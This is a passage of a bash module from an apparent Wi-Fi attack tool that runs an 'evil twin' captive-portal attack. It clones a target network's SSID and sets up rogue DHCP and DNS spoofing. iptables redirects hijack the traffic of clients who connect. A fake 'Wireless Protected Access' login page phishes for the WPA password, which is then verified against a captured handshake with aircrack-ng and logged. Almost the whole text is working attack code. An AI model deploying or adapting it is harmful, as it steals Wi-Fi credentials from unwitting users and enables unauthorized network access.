# the following character. Carriage returns and newlines are dropped first,
# because no line-based config can represent them and an embedded newline
# would let a hostile SSID inject extra template lines.
captive_portal_sed_replacement() {
  printf '%s' "${1//$'\r'/}" | tr -d '\n' | sed -e 's/[\\/&]/\\&/g'
}

# Substitute the target's SSID, BSSID and channel into every rendered file.
captive_portal_render_target() {
  local __ssid __mac __channel
  __ssid=$(captive_portal_sed_replacement "$CapCapTargetSSID")
  __mac=$(captive_portal_sed_replacement "$CapCapTargetMAC")
  __channel=$(captive_portal_sed_replacement "$CapCapTargetChannel")

  find "$CAPCAPWorkspacePath/captive_portal/" -type f -exec \
    sed -i -e "s/\$APTargetSSID/$__ssid/g" \
           -e "s/\$APTargetMAC/$__mac/g" \
           -e "s/\$APTargetChannel/$__channel/g" {} +
}

# Create different settings required for the script
captive_portal_set_attack() {
  local -r attackPath="$CAPCAPPath/attacks/Captive Portal"
  # Load and set the captive portal user interface to the workspace.
  # Check whether it's a custom, generic, or invalid portal.
  if [ -d "$attackPath/sites/$CaptivePortalUserInterface.portal" ]; then
    cp -r "$attackPath/sites/$CaptivePortalUserInterface.portal" \
      "$CAPCAPWorkspacePath/captive_portal"
  elif [ -f "$attackPath/generic/languages/$CaptivePortalUserInterface.lang" ]; then
    source "$attackPath/generic/languages/$CaptivePortalUserInterface.lang"
    captive_portal_generic
  else
    return 1
  fi

  captive_portal_render_target


  # Add the PHP authenticator scripts, used to verify
  # password attempts from users using the web interface.
  local authenticatorFiles=("authenticator.php" "check.php" "update.php")

  for authenticatorFile in "${authenticatorFiles[@]}"; do
    cp "$CAPCAPPath/attacks/Captive Portal/lib/$authenticatorFile" \
      "$CAPCAPWorkspacePath/captive_portal/$authenticatorFile"
    sed -i -e 's/\$CAPCAPWorkspacePath/'"${CAPCAPWorkspacePath//\//\\\/}"'/g' \
      "$CAPCAPWorkspacePath/captive_portal/$authenticatorFile"
    chmod u+x "$CAPCAPWorkspacePath/captive_portal/$authenticatorFile"
  done

  # Add the files for captive portal internet connectivity checks.
  cp -r "$CAPCAPPath/attacks/Captive Portal/lib/connectivity responses/" \
    "$CAPCAPWorkspacePath/captive_portal/connectivity_responses"


  # AP Service: Prepare service for an attack.
  if [ "$CaptivePortalAPService" ]; then
    ap_service_prep \
      "$CaptivePortalAccessPointInterface" \
      "$CaptivePortalGatewayAddress" \
      "$CapCapTargetSSID" \
      "$CapCapTargetRogueMAC" \
      "${CaptivePortalAccessPointChannel:-$CapCapTargetChannel}"

    CaptivePortalAccessInterface=$APServiceAccessInterface
  fi


  # Generate the kea-dhcp4 configuration file, which is
  # used to provide DHCP service to rogue AP clients.
  local -r CaptivePortalKeaInterface=${CaptivePortalAccessInterface:-*}
  echo "\
{
  \"Dhcp4\": {
    \"interfaces-config\": {
      \"interfaces\": [ \"$CaptivePortalKeaInterface\" ]
    },
    \"lease-database\": {
      \"type\": \"memfile\",
      \"persist\": true,
      \"name\": \"$CaptivePortalKeaLeases\"
    },
    \"authoritative\": true,
    \"valid-lifetime\": 600,
    \"max-valid-lifetime\": 7200,
    \"subnet4\": [
      {
        \"id\": 1,
        \"subnet\": \"$CaptivePortalGatewayNetwork.0/24\",
        \"pools\": [ { \"pool\": \"$CaptivePortalGatewayNetwork.$CaptivePortalGatewayPoolStart - $CaptivePortalGatewayNetwork.$CaptivePortalGatewayPoolEnd\" } ],
        \"option-data\": [
          { \"name\": \"routers\", \"data\": \"$CaptivePortalGatewayAddress\" },
          { \"name\": \"domain-name-servers\", \"data\": \"$CaptivePortalGatewayAddress\" },
          { \"name\": \"subnet-mask\", \"data\": \"255.255.255.0\" },
          { \"name\": \"broadcast-address\", \"data\": \"$CaptivePortalGatewayNetwork.255\" }
        ]
      }
    ],
    \"loggers\": [
      {
        \"name\": \"kea-dhcp4\",
        \"output-options\": [ { \"output\": \"stdout\" } ],
        \"severity\": \"INFO\"
      }
    ]
  }
}\
" >"$CAPCAPWorkspacePath/kea-dhcp4.conf"

  # Generate configuration for a lighttpd web-server.
  # Resolve php-cgi instead of assuming /usr/bin: Debian and Kali ship it
  # there, other distributions and local builds put it in /usr/local/bin.
  local phpCgi
  phpCgi=$(command -v php-cgi 2>/dev/null || echo /usr/bin/php-cgi)

  echo "\
server.document-root = \"$CAPCAPWorkspacePath/captive_portal/\"

server.modules = (
    \"mod_access\",
    \"mod_alias\",
    \"mod_accesslog\",
    \"mod_fastcgi\",
    \"mod_redirect\",
    \"mod_rewrite\"
)

accesslog.filename = \"$CAPCAPWorkspacePath/lighttpd.log\"

fastcgi.server = (
    \".php\" => (
        (
            \"bin-path\" => \"$phpCgi\",
            \"socket\" => \"$CAPCAPWorkspacePath/php.socket\"
        )
    )
)

server.port = 80
server.pid-file = \"/var/run/lighttpd.pid\"
# server.username = \"www\"
# server.groupname = \"www\"

mimetype.assign = (
    \".html\" => \"text/html\",
    \".htm\" => \"text/html\",
    \".txt\" => \"text/plain\",
    \".jpg\" => \"image/jpeg\",
    \".png\" => \"image/png\",
    \".css\" => \"text/css\"
)


server.error-handler-404 = \"/\"

static-file.exclude-extensions = (
    \".fcgi\",
    \".php\",
    \".rb\",
    \"~\",
    \".inc\"
)

index-file.names = (
    \"index.htm\",
    \"index.html\",
    \"index.php\"
)
" >"$CAPCAPWorkspacePath/lighttpd.conf"

  # Configure lighttpd's SSL only if we've got a certificate and its key.
  if [ -f "$CAPCAPWorkspacePath/server.pem" -a -s "$CAPCAPWorkspacePath/server.pem" ]; then
    echo "\
\$SERVER[\"socket\"] == \":443\" {
    ssl.engine = \"enable\"
    ssl.pemfile = \"$CAPCAPWorkspacePath/server.pem\"
}
" >>"$CAPCAPWorkspacePath/lighttpd.conf"
  fi

  if [ "$CaptivePortalConnectivity" = "emulated" ]; then
    echo "\
# The following will emulate Apple's and Google's internet connectivity checks.
# This should help with no-internet-connection warnings in some devices.
\$HTTP[\"host\"] == \"captive.apple.com\" { # Respond with Apple's captive response.
    server.document-root = \"$CAPCAPWorkspacePath/captive_portal/connectivity_responses/Apple/\"
}

# Respond with Google's captive response on certain domains.
# Domains: www.google.com, clients[0-9].google.com, connectivitycheck.gstatic.com, connectivitycheck.android.com, android.clients.google.com, alt[0-9]-mtalk.google.com, mtalk.google.com
\$HTTP[\"host\"] =~ \"((www|(android\.)?clients[0-9]*|(alt[0-9]*-)?mtalk)\.google|connectivitycheck\.(android|gstatic))\.com\" {
    server.document-root = \"$CAPCAPWorkspacePath/captive_portal/connectivity_responses/Google/\"
    url.rewrite-once = ( \"^/generate_204\$\" => \"generate_204.php\" )
}
" >>"$CAPCAPWorkspacePath/lighttpd.conf"
  else
    echo "\
# Redirect all traffic to the captive portal when not emulating a connection.
\$HTTP[\"host\"] != \"captive.gateway.lan\" {
    url.redirect-code = 307
    url.redirect  = (
        \"^/(.*)\" => \"http://captive.gateway.lan/\",
    )
}
" >>"$CAPCAPWorkspacePath/lighttpd.conf"
  fi

  # Create a temporary hosts file to be used with dnsspoof
  echo "\
${CaptivePortalGatewayAddress}	*.*
172.217.5.238	google.com
172.217.13.78	clients3.google.com
172.217.13.78	clients4.google.com
" >"$CAPCAPWorkspacePath/hosts"

  #chmod +x "$CAPCAPWorkspacePath/capcap_captive_portal_dns.py"

  local -r targetSSIDCleanNormalized=${CapCapTargetSSIDClean//"/\\"}
  # Attack arbiter script
  echo "\
#!/usr/bin/env bash

signal_stop_attack() {
    kill -s SIGABRT $$ # Signal STOP ATTACK
    handle_abort_authenticator
}

handle_abort_authenticator() {
    AuthenticatorState=\"aborted\"
}

trap signal_stop_attack SIGINT SIGHUP
trap handle_abort_authenticator SIGABRT

echo > \"$CAPCAPWorkspacePath/candidate.txt\"
echo -n \"0\"> \"$CAPCAPWorkspacePath/hit.txt\"

# Assure we've got a directory to store net logs into.
if [ ! -d \"$CaptivePortalNetLog\" ]; then
    mkdir -p \"$CaptivePortalNetLog\"
fi

# Assure we've got a directory to store pwd logs into.
if [ ! -d \"$CaptivePortalPassLog\" ]; then
    mkdir -p \"$CaptivePortalPassLog\"
fi

# Make console cursor invisible, cnorm to revert.
tput civis
clear

m=0
h=0
s=0
i=0

AuthenticatorState=\"running\"

startTime=\$(date +%s)

while [ \$AuthenticatorState = \"running\" ]; do
    let s=\$(date +%s)-\$startTime

    d=\`expr \$s / 86400\`
    s=\`expr \$s % 86400\`
    h=\`expr \$s / 3600\`
    s=\`expr \$s % 3600\`
    m=\`expr \$s / 60\`
    s=\`expr \$s % 60\`

    if [ \"\$s\" -le 9 ]; then
        is=\"0\"
    else
        is=
    fi

    if [ \"\$m\" -le 9 ]; then
        im=\"0\"
    else
        im=
    fi

    if [ \"\$h\" -le 9 ]; then
        ih=\"0\"
    else
        ih=
    fi

    if [ -f \"$CAPCAPWorkspacePath/pwdattempt.txt\" -a -s \"$CAPCAPWorkspacePath/pwdattempt.txt\" ]; then
        # Save any new password attempt.
        cat \"$CAPCAPWorkspacePath/pwdattempt.txt\" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$CapCapTargetMAC.log\"

        # Clear logged password attempt.
        echo -n > \"$CAPCAPWorkspacePath/pwdattempt.txt\"
    fi

    if [ -s \"$CAPCAPWorkspacePath/ip_hits\" ]; then
        cat \"$CAPCAPWorkspacePath/ip_hits\" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$CapCapTargetMAC-IP.log\"
        echo \" \" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$CapCapTargetMAC-IP.log\"
        echo -n > \"$CAPCAPWorkspacePath/ip_hits\"
    fi

" >>"$CAPCAPWorkspacePath/captive_portal_authenticator.sh"

  if [[ "$CaptivePortalAuthenticatorMode" = "hash"* ]]; then
    case "$CaptivePortalAuthenticatorMode" in
      # Cowpatty
      "$CaptivePortalVerificationMethodCowpattyOption")
        local -r verifiedCondition="cowpatty -f \"$CAPCAPWorkspacePath/candidate.txt\" -r \"$CaptivePortalHashPath\" -s \"$CapCapTargetSSID\" &>> $CAPCAPOutputDevice"
        ;;
      # Pyrit
      "$CaptivePortalVerificationMethodPyritOption")
        local -r verifiedCondition="pyrit -r \"$CaptivePortalHashPath\" -i \"$CAPCAPWorkspacePath/candidate.txt\" -b $CapCapTargetMAC attack_passthrough &>> $CAPCAPOutputDevice"
        ;;

      *)
        # Aircrack-ng
        # Confirm the candidate by having aircrack-ng WRITE the recovered
        # key to a file (-l); the password is correct only when that file
        # ends up non-empty. The previous check inferred success from the
        # ABSENCE of \"KEY NOT FOUND\"/\"Passphrase not in\" in aircrack's
        # output, which false-accepts ANY password whenever aircrack prints
        # neither string (e.g. \"No matching network found\" when the capture
        # holds no usable handshake). Remove any stale key first.
        local -r verifiedCondition="rm -f \"$CAPCAPWorkspacePath/candidate.key\"; aircrack-ng -a 2 -b $CapCapTargetMAC -w \"$CAPCAPWorkspacePath/candidate.txt\" -l \"$CAPCAPWorkspacePath/candidate.key\" \"$CaptivePortalHashPath\" &>> $CAPCAPOutputDevice; [ -s \"$CAPCAPWorkspacePath/candidate.key\" ]"
        ;;
    esac
    echo "
    if [ -f \"$CAPCAPWorkspacePath/candidate_result.txt\" ]; then
        if $verifiedCondition; then
            echo \"2\" > \"$CAPCAPWorkspacePath/candidate_result.txt\"
            sleep 1
            break
        else
            echo \"1\" > \"$CAPCAPWorkspacePath/candidate_result.txt\"
        fi
    fi" >> "$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
  fi

  local -r staticSSID=$(printf "%q" "$CapCapTargetSSID" | sed -r 's/\\\ / /g' | sed -r "s/\\\'/\'/g")

  # Show the rogue AP channel separately only when it differs from the target's.
  local -r rogueAPChannel="${CaptivePortalAccessPointChannel:-$CapCapTargetChannel}"
  local apChannelInfoLine=""
  if [ "$rogueAPChannel" != "$CapCapTargetChannel" ]; then
    apChannelInfoLine="    echo -e \"    AP Channel .....: ${CWht}${rogueAPChannel}${CClr}\""
  fi

  echo "
    echo
    echo -e \"  ACCESS POINT:\"
    printf  \"    SSID ...........: $CWht%s$CClr\\n\" \"$staticSSID\"
    echo -e \"    MAC ............: $CYel$CapCapTargetMAC$CClr\"
    echo -e \"    Channel ........: $CWht$CapCapTargetChannel$CClr\"
$apChannelInfoLine
    echo -e \"    Vendor .........: $CGrn${CapCapTargetMaker:-UNKNOWN}$CClr\"
    echo -e \"    Runtime ........: $CBlu\$ih\$h:\$im\$m:\$is\$s$CClr\"
    echo -e \"    Attempts .......: $CRed\$(cat $CAPCAPWorkspacePath/hit.txt)$CClr\"
    echo -e \"    Clients ........: $CBlu\$(awk -F, 'NR>1 && \$10==0 {print \$2}' \"$CaptivePortalKeaLeases\" 2>/dev/null | sort| uniq | wc -l)$CClr\"
    echo
    echo -e \"  CLIENTS ONLINE:\"
" >>"$CAPCAPWorkspacePath/captive_portal_authenticator.sh"

  if [ "$CaptivePortalAPService" = "airbase-ng" ]; then
    echo "
    readarray -t CaptivePortalLeaseIPs < <(awk -F, 'NR>1 && \$10==0 {print \$1}' \"$CaptivePortalKeaLeases\" 2>/dev/null | sort -u)
    if [ \${#CaptivePortalLeaseIPs[@]} -gt 0 ]; then
        nmap -sn -PR -n \"\${CaptivePortalLeaseIPs[@]}\" &>/dev/null
    fi

    CaptivePortalLeaseMACs=\$(awk -F, 'NR>1 && \$10==0 {print tolower(\$2)}' \"$CaptivePortalKeaLeases\" 2>/dev/null | sort -u)

    x=0
    while read -r LeaseMAC; do
        [ -z \"\$LeaseMAC\" ] && continue

        LeaseIP=\$(awk -F, -v m=\"\$LeaseMAC\" 'NR>1 && \$10==0 && tolower(\$2)==m {print \$1; exit}' \"$CaptivePortalKeaLeases\" 2>/dev/null)
        if [ -z \"\$LeaseIP\" ]; then continue; fi
        if ! ip -4 neigh show \"\$LeaseIP\" 2>/dev/null | grep lladdr | grep -qv FAILED; then continue; fi

        LeaseHost=\$(awk -F, -v m=\"\$LeaseMAC\" 'NR>1 && \$10==0 && tolower(\$2)==m {print \$9; exit}' \"$CaptivePortalKeaLeases\" 2>/dev/null)

        x=\$((\$x+1))

        LeaseMID=\$(macchanger -l | grep \"\$(echo \"\$LeaseMAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)
        if [ -z \"\$LeaseMID\" ]; then LeaseMID=\"unknown\"; fi

        echo -e \"$CGrn\$x) $CRed\$LeaseIP $CYel\$LeaseMAC $CGrn\$LeaseHost $CClr($CBlu\$LeaseMID$CClr)\"
    done <<< \"\$CaptivePortalLeaseMACs\"

    echo -ne \"\033[J\033[u\"" >>"$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
  else
    echo "
    CaptivePortalStationMACs=\$(iw dev \"$CaptivePortalAccessInterface\" station dump 2>/dev/null | awk '/^Station/ {print tolower(\$2)}' | sort -u)

    x=0
    while read -r StationMAC; do
        [ -z \"\$StationMAC\" ] && continue

        StationIP=\$(awk -F, -v m=\"\$StationMAC\" 'NR>1 && \$10==0 && tolower(\$2)==m {print \$1; exit}' \"$CaptivePortalKeaLeases\" 2>/dev/null)
        if [ -z \"\$StationIP\" ]; then continue; fi

        StationHost=\$(awk -F, -v m=\"\$StationMAC\" 'NR>1 && \$10==0 && tolower(\$2)==m {print \$9; exit}' \"$CaptivePortalKeaLeases\" 2>/dev/null)

        x=\$((\$x+1))

        StationMID=\$(macchanger -l | grep \"\$(echo \"\$StationMAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)
        if [ -z \"\$StationMID\" ]; then StationMID=\"unknown\"; fi

        echo -e \"$CGrn\$x) $CRed\$StationIP $CYel\$StationMAC $CGrn\$StationHost $CClr($CBlu\$StationMID$CClr)\"
    done <<< \"\$CaptivePortalStationMACs\"

    y=0
    while read -r StationMAC; do
        [ -z \"\$StationMAC\" ] && continue

        StationIP=\$(awk -F, -v m=\"\$StationMAC\" 'NR>1 && \$10==0 && tolower(\$2)==m {print \$1; exit}' \"$CaptivePortalKeaLeases\" 2>/dev/null)
        if [ -n \"\$StationIP\" ]; then continue; fi

        if [ \$y -eq 0 ]; then
            echo
            echo -e \"  CLIENTS WITHOUT IP:\"
        fi
        y=\$((\$y+1))

        StationMID=\$(macchanger -l | grep \"\$(echo \"\$StationMAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)
        if [ -z \"\$StationMID\" ]; then StationMID=\"unknown\"; fi

        echo -e \"$CGrn\$y) $CYel\$StationMAC $CClr($CBlu\$StationMID$CClr)\"
    done <<< \"\$CaptivePortalStationMACs\"

    echo -ne \"\033[J\033[u\"" >>"$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
  fi

  if [[ "$CaptivePortalAuthenticatorMode" = "hash"* ]]; then
    echo "
    sleep 1" >>"$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
  fi

  echo "
done

if [ \$AuthenticatorState = \"aborted\" ]; then exit 1; fi

clear
echo \"1\" > \"$CAPCAPWorkspacePath/status.txt\"

# Mark success so capcap can keep the authenticator window open once.
touch "$CAPCAPWorkspacePath/authenticator_success.flag"

# sleep 7
sleep 3

signal_stop_attack

# Resolve client IP/MAC/brand at runtime.
ClientIP=\$(if [ -f \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$CapCapTargetMAC-IP.log\" ]; then cat \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$CapCapTargetMAC-IP.log\" | sed '/^\s*$/d' | tail -n 1; fi)
if [ -z \"\$ClientIP\" ]; then ClientIP=\"unknown\"; fi
if [ \"\$ClientIP\" != \"unknown\" ] && [ -f \"$CaptivePortalKeaLeases\" ]; then
    ClientMAC=\$(awk -F, -v ip=\"\$ClientIP\" 'NR>1 && \$1==ip {mac=\$2} END{print mac}' \"$CaptivePortalKeaLeases\" | tr [:upper:] [:lower:])
else
    ClientMAC=\"unknown\"
fi
if [ \"\$(echo \"\$ClientMAC\" | wc -m)\" != \"18\" ]; then ClientMAC=\"unknown\"; fi
if [ \"\$ClientMAC\" != \"unknown\" ]; then
    ClientBrand=\$(macchanger -l | grep \"\$(echo \"\$ClientMAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)
else
    ClientBrand=\"unknown\"
fi
if echo \"\$ClientBrand\" | grep -q x; then ClientBrand=\"unknown\"; fi

echo \"
CAPCAPWIFI $CAPCAPVersion.$CAPCAPRevision

SSID: \\\"$staticSSID\\\"
BSSID: $CapCapTargetMAC ($CapCapTargetMaker)
Channel: $CapCapTargetChannel
Security: $CapCapTargetEncryption
Time: \$ih\$h:\$im\$m:\$is\$s
Password: \$(cat $CAPCAPWorkspacePath/candidate.txt)
Mac: \$ClientMAC (\$ClientBrand)
IP: \$ClientIP
\" >\"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$CapCapTargetMAC.log\"" >>"$CAPCAPWorkspacePath/captive_portal_authenticator.sh"

  if [[ "$CaptivePortalAuthenticatorMode" = "hash"* ]]; then
#    echo "
# aircrack-ng -a 2 -b $CapCapTargetMAC -0 -s \"$CaptivePortalHashPath\" -w \"$CAPCAPWorkspacePath/candidate.txt\" && echo && echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$CapCapTargetMAC.log"$CClr"\"\
#" >>"$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
    echo "
    echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$CapCapTargetMAC.log"$CClr"\"\
      " >>"$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
  fi

  chmod +x "$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
}

# Generate the contents for a generic web interface
captive_portal_generic() {
  if [ ! -d "$CAPCAPWorkspacePath/captive_portal" ]; then
    mkdir "$CAPCAPWorkspacePath/captive_portal"
  fi

  base64 -d "$CAPCAPPath/attacks/Captive Portal/generic/assets" >"$CAPCAPWorkspacePath/file.zip"

  unzip "$CAPCAPWorkspacePath/file.zip" -d "$CAPCAPWorkspacePath/captive_portal" &>$CAPCAPOutputDevice
  sandbox_remove_workfile "$CAPCAPWorkspacePath/file.zip"

  echo "\
<!DOCTYPE html>
<html>
    <head>
        <meta charset=\"UTF-8\">
        <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">

        <title>Wireless Protected Access: Verifying</title>

        <!-- Styles -->
        <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
        <link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>

        <!-- Scripts -->
        <script src=\"js/jquery-1.11.1.min.js\"></script>
        <script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
    </head>
    <body>
        <!-- final page -->
        <div id=\"done\" data-role=\"page\" data-theme=\"a\">
            <div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
                <h3 style=\"text-align:center;\">$DIALOG_WEB_OK</h3>
            </div>
        </div>
    </body>
</html>" >"$CAPCAPWorkspacePath/captive_portal/final.html"

  echo "\
<!DOCTYPE html>
<html>
    <head>
        <meta charset=\"UTF-8\">
        <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">

        <title>Wireless Protected Access: Key Mismatch</title>

        <!-- Styles -->
        <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
        <link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>

        <!-- Scripts -->
        <script src=\"js/jquery-1.11.1.min.js\"></script>
        <script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
        <script src=\"js/jquery.validate.min.js\"></script>
        <script src=\"js/additional-methods.min.js\"></script>
    </head>
    <body>
        <!-- Error page -->
        <div data-role=\"page\" data-theme=\"a\">
            <div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
                <h3 style=\"text-align:center;\">$DIALOG_WEB_ERROR</h3>
                <a href=\"index.html\" class=\"ui-btn ui-corner-all ui-shadow\" onclick=\"location.href='index.html'\">$DIALOG_WEB_BACK</a>
            </div>
        </div>
    </body>
</html>" >"$CAPCAPWorkspacePath/captive_portal/error.html"

  echo "\
<!DOCTYPE html>
<html>
    <head>
        <meta charset=\"UTF-8\">
        <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">

        <title>Wireless Protected Access: Login</title>

        <!-- Styles -->
        <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
        <link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>

        <!-- Scripts -->
        <script src=\"js/jquery-1.11.1.min.js\"></script>
        <script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
        <script src=\"js/jquery.validate.min.js\"></script>
        <script src=\"js/additional-methods.min.js\"></script>
    </head>
    <body>
        <!-- Main page -->
        <div data-role=\"page\" data-theme=\"a\">
            <div class=\"ui-content\" dir=\"$DIALOG_WEB_DIR\">
                <fieldset>
                    <form id=\"loginForm\" class=\"ui-body ui-body-b ui-corner-all\" action=\"check.php\" method=\"POST\">
                        </br>
                        <div class=\"ui-field-contain ui-responsive\" style=\"text-align:center;\">
                            <div><u>$CapCapTargetSSID</u> ($CapCapTargetMAC)</div>
                            <!--<div>Channel: $CapCapTargetChannel</div>-->
                        </div>
                        <div style=\"text-align:center;\">
                            <br>
                            <label>$DIALOG_WEB_INFO</label>
                            <br>
                        </div>
                        <div class=\"ui-field-contain\">
                            <label for=\"key1\">$DIALOG_WEB_INPUT</label>
                            <input id=\"key1\" style=\"color:#333; background-color:#CCC\" data-clear-btn=\"true\" type=\"password\" value=\"\" name=\"key1\" maxlength=\"64\"/>
                        </div>
                        <input data-icon=\"check\" data-inline=\"true\" name=\"submitBtn\" type=\"submit\" value=\"$DIALOG_WEB_SUBMIT\"/>
                    </form>
                </fieldset>
            </div>
        </div>

        <script src=\"js/main.js\"></script>

        <script>
            $.extend( $.validator.messages, {
                required: \"$DIALOG_WEB_ERROR_MSG\",
                maxlength: $.validator.format( \"$DIALOG_WEB_LENGTH_MAX\" ),
                minlength: $.validator.format( \"$DIALOG_WEB_LENGTH_MIN\" )
            });
        </script>
    </body>
</html>" >"$CAPCAPWorkspacePath/captive_portal/index.html"


}

captive_portal_unset_routes() {
  if [ -f "$CAPCAPIPTablesBackup" ]; then
    iptables-restore <"$CAPCAPIPTablesBackup" \
      &>> $CAPCAPOutputDevice
  else
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
  fi

  # Restore system's original forwarding state
  if [ -f "$CAPCAPWorkspacePath/ip_forward" ]; then
    sysctl -w net.ipv4.ip_forward=$(
      cat "$CAPCAPWorkspacePath/ip_forward"
    ) &>> $CAPCAPOutputDevice
    sandbox_remove_workfile "$CAPCAPWorkspacePath/ip_forward"
  fi

  if [ "$CaptivePortalAccessInterface" ] && [ "$CaptivePortalGatewayAddress" ]; then
    ip addr del "$CaptivePortalGatewayAddress/24" dev "$CaptivePortalAccessInterface" 2>/dev/null
  fi
}

# Set up DHCP / WEB server
# Set up DHCP / WEB server
captive_portal_set_routes() {
  # Give an address to the gateway interface in the rogue network.
  # This makes the interface accessible from the rogue network.
  ip addr add "$CaptivePortalGatewayAddress/24" dev "$CaptivePortalAccessInterface" 2>/dev/null

  # Save the system's routing state to restore later.
  cp "/proc/sys/net/ipv4/ip_forward" "$CAPCAPWorkspacePath/ip_forward"

  # Activate system IPV4 packet routing/forwarding.
  sysctl -w net.ipv4.ip_forward=1 &>$CAPCAPOutputDevice

  iptables --flush
  iptables --table nat --flush
  iptables --delete-chain
  iptables --table nat --delete-chain
  iptables -P FORWARD ACCEPT

  iptables -A INPUT -p tcp --dport 443 -j ACCEPT
  iptables -A INPUT -p tcp --dport 80 -j ACCEPT
  iptables -A INPUT -p udp --dport 53 -j ACCEPT
  iptables -A INPUT -p tcp --dport 53 -j ACCEPT
  iptables -A INPUT -p udp --dport 67 -j ACCEPT

  iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT \
    --to-destination $CaptivePortalGatewayAddress:80
  iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT \
    --to-destination $CaptivePortalGatewayAddress:443

  # Force every client DNS query to the local resolver. A phone with a
  # hard-coded DNS (or one that ignores the DHCP option) would otherwise never
  # reach dnsspoof, so "captive.gateway.lan" would not resolve and the portal
  # page would never load.
  iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT \
    --to-destination $CaptivePortalGatewayAddress:53
  iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT \
    --to-destination $CaptivePortalGatewayAddress:53

  # DNS-over-TLS cannot be redirected without breaking the TLS session.
  # Reject it quickly so the client falls back to plain DNS instead of
  # deciding the network is dead.
  iptables -A INPUT -p tcp --dport 853 -j REJECT
  iptables -A INPUT -p udp --dport 853 -j REJECT
  iptables -A FORWARD -p tcp --dport 853 -j REJECT
  iptables -A FORWARD -p udp --dport 853 -j REJECT

  iptables -t nat -A POSTROUTING -j MASQUERADE
}

captive_portal_stop_interface() {
  captive_portal_unset_routes

  if [ "$CaptivePortalAPService" ]; then
    ap_service_stop
  fi
}

captive_portal_start_interface() {
  if [ "$CaptivePortalAPService" ]; then
    echo -e "$CAPCAPVLine $CaptivePortalStaringAPServiceNotice"
    ap_service_start || return 1
  else
    capcap_header

    echo -e "$CAPCAPVLine Configuration for external access point device:"
    echo

    capcap_target_show

    echo -e "$CAPCAPVLine IPv4 Address: ${CaptivePortalGatewayAddress%.*}.2/24"
    echo -e "$CAPCAPVLine IPv6 Address: Disabled"
    echo -e "$CAPCAPVLine  DHCP Server: $CaptivePortalGatewayAddress"
    echo -e "$CAPCAPVLine   DNS Server: $CaptivePortalGatewayAddress"
    echo

    echo -e "$CAPCAPVLine ${CYel}Assure external AP device is available & configured before continuing!${CClr}"
    if [ ! "$CAPCAPAuto" ]; then
      read -n1 -p "Press any key to continue... " bullshit
    fi
  fi

  echo -e "$CAPCAPVLine $CaptivePortalStaringAPRoutesNotice"
  captive_portal_set_routes &
  sleep 3

  fuser -n tcp -k 53 67 80 443 &>> $CAPCAPOutputDevice
  fuser -n udp -k 53 67 80 443 &>> $CAPCAPOutputDevice
}


# ============================================================ #
# =================== < Parse Parameters > =================== #
# ============================================================ #
if [ ! "$CaptivePortalCLIArguments" ]; then
  if ! CaptivePortalCLIArguments=$(
    getopt --options="a:j:s:c:u:h:n" \
      --longoptions="ap:,jammer:,ssl:,connectivity:,ui:,hash:,network-manager" \
      --name="Captive Portal V$CAPCAPVersion.$CAPCAPRevision" -- "$@"
    ); then
    echo -e "${CRed}Aborted$CClr, parameter error detected..."
    sleep 5
    capcap_handle_exit
  fi

  declare -r CaptivePortalCLIArguments=$CaptivePortalCLIArguments

  eval set -- "$CaptivePortalCLIArguments" # Set environment parameters.
fi


# ============================================================ #
# ============= < Argument Loaded Configurables > ============ #
# ============================================================ #
while [ "$1" != "" -a "$1" != "--" ]; do
  case "$1" in
    -a|--ap)
      CaptivePortalAccessPointInterfaceOriginal=$2; shift;;
    -j|--jammer)
      CaptivePortalJammerInterfaceOriginal=$2; shift;;
    -s|--ssl)
      CaptivePortalSSLCertificatePath=$2; shift;;
    -c|--connectivity)
      CaptivePortalConnectivity=$2; shift;;
    -u|--ui)
      CaptivePortalUserInterface=$2; shift;;
    -h|--hash)
      # Assuming hash auth-mode here (the only one available as of now).
      # WARNING: If more auth-modes are added, assume hash auth-mode here!
      CaptivePortalHashPath=$2; shift;;
    -n|--network-manager)
      CaptivePortalNetworkManagerShutoff="disabled";;
  esac
  shift # Shift new parameters
done


# ============================================================ #
# ===================== < CapCap Hooks > ==================== #
# ============================================================ #
attack_targetting_interfaces() {
  interface_list_wireless
  local interface
  for interface in "${InterfaceListWireless[@]}"; do
    echo "$interface"
  done
}

